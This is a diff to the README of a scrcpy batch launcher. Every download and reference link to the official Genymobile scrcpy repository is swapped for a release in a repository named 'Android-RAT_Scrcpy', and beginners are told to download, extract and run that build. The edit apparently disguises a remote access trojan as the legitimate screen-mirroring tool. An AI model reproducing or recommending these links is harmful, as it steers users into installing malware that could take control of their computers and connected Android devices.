@@ -2,7 +2,7 @@
 
 📱 scrcpy-batch-launcher
 
-**A simplified, GUI-like batch launcher and usage guide for [scrcpy](https://github.com/Genymobile/scrcpy)**  
+**A simplified, GUI-like batch launcher and usage guide for [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy)**  
 This tool helps beginners and automation users launch `scrcpy.exe` easily via USB or Wi-Fi without memorizing complex ADB commands.
 
 ---
@@ -38,7 +38,7 @@ This tool helps beginners and automation users launch `scrcpy.exe` easily via US
 ## Requirements
 
 - 🖥️ Windows 10/11
-- ✅ [scrcpy](https://github.com/Genymobile/scrcpy) and `adb.exe` placed in same folder
+- ✅ [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy) and `adb.exe` placed in same folder
 - 📱 Android device with:
   - Developer Mode enabled
   - USB Debugging ON
@@ -47,7 +47,7 @@ This tool helps beginners and automation users launch `scrcpy.exe` easily via US
 
 ## How to Use
 
-1. **Download [scrcpy](https://github.com/Genymobile/scrcpy/releases) and extract it.**
+1. **Download [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy) and extract it.**
 2. Place `scrcpy_guide_runner.bat` and `scrcpy_guide.txt` in the same folder as `scrcpy.exe`.
 3. Double-click `scrcpy_guide_runner.bat` and follow the interactive prompts.
 4. ✅ Done! You're mirroring Android with just a few keystrokes.
